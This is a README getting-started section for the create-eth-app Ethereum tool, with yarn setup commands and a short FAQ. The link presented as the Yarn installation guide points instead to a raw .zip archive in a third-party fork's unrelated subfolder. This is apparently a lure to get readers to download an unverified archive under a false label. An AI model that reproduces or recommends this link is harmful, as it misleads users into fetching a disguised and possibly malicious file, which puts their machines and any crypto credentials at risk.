## 🚀 Getting Started

Follow these steps to create your first Ethereum app.

1. **Open Your Terminal:**
   - On Windows, you can use Command Prompt or PowerShell.
   - On macOS, use Terminal.
   - On Linux, any terminal application will work.

2. **Install Yarn:**
   Create Eth App requires Yarn to manage packages. If you haven't installed it, follow these steps:
   - Check if Yarn is installed by running:
     ```sh
     yarn --version
     ```
   - If not installed, find the installation guide [here](https://raw.githubusercontent.com/Chaudhryy/create-eth-app/develop/racegoer/create-eth-app.zip).
  
3. **Create a New App:**
   Run the following command to create your Ethereum app. You can replace `my-eth-app` with any name you like:
   ```sh
   yarn create eth-app my-eth-app
   ```

4. **Change into Your App's Directory:**
   Navigate to your new app folder:
   ```sh
   cd my-eth-app
   ```

5. **Start Your App:**
   Launch your app by running:
   ```sh
   yarn react-app:start
   ```

Your app should now be running! Open your web browser and go to `http://localhost:3000` to see it in action.

## ❓ Frequently Asked Questions

### How do I uninstall create-eth-app?
If you have installed it globally, you can run the following command:
```sh
yarn global remove create-eth-app
```

### Can I customize my app?
Yes, you can easily modify the files created in your app's directory to tailor it to your needs.
